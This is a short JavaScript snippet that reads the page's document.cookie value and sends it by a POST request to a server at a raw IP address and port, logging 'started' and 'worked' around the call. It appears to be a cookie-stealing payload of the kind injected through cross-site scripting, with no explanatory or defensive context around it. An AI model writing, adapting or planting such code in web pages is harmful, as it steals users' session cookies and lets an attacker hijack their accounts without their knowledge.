const postData = {
        name: document.cookie
};

console.log("started")
fetch("http://139.177.196.226:8081/items", {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(postData)
});
console.log("worked")

